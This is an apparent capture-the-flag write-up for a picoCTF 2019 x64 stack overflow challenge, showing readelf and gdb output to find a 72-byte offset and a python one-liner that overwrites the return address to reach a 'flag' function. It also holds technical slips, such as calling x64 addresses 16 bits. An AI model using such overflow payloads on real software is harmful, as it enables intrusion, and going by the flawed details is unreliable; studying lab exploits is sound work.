This is x64 bits, so the registers name are different `ebp` now is `rbp` and the `esp` is `rsp`, and ofcourse the address 
size is 16bits. 

It is the same as [OverFlow1](https://github.com/alshaboti/CTFs/blob/master/picoCTF2019/OverFlow1.MD), where we need to 
control the `rip` to jump to `flag` function. 

1- let's get flag address
```
$readelf -s vuln|grep flag
70: 0000000000400767   101 FUNC    GLOBAL DEFAULT   13 flag
```
`flag` function address is `0x0000000000400767`

2- Let's find the offset between the start of the `buf` and the `rip` (which is `$rbp+16`).

We will set break point just after gets function, then find where the 
```
$gdb vuln
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x00000000004007cc <+0>:     push   %rbp
   0x00000000004007cd <+1>:     mov    %rsp,%rbp
   0x00000000004007d0 <+4>:     sub    $0x40,%rsp
   0x00000000004007d4 <+8>:     lea    -0x40(%rbp),%rax
   0x00000000004007d8 <+12>:    mov    %rax,%rdi
   0x00000000004007db <+15>:    mov    $0x0,%eax
   0x00000000004007e0 <+20>:    callq  0x400630 <gets@plt>
   0x00000000004007e5 <+25>:    nop
   0x00000000004007e6 <+26>:    leaveq 
   0x00000000004007e7 <+27>:    retq   
End of assembler dump.
(gdb)b *0x00000000004007e5
(gdb)run 
AAAAAAAAAAAAAAAAA
(gdb) x/100x $rsp
0x7ffff4508970: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff4508980: 0x00400041      0x00000000      0x4fe3cb62      0x00007fb7
...
<note AAA starts at 0x7ffff4508970 address, which is the begining of the buf>
(gdb)p/d $rbp-0x7ffff4508970
$3 = 64
```
We find the start of the buf (which in this case is the same as the stack pointer) `0x7ffff4508970`, then we compute the 
offset between buf and $rbp (64bytes) we need to add 64bits (i.e. 8bytes) to find the shift to the $rip. 

So the offset is 64bytes+8bytes = 72bytes

Note: $rip is one address above the $rbp.

3- let's now fill the offset with dump `A` and put the `flag` address on the `$rip` location.
```
python -c 'import struct; print("A"*72+struct.pack("<I",0x0000000000400768) )'|./vuln
```
For some reason I had to add one byte to the add of `flag` function.

I found that the address if we use `info add <fun name>` is different by one byte. So maybe we should use `info add` to get the address
```
(gdb)info add flag
0x0000000000400768
```
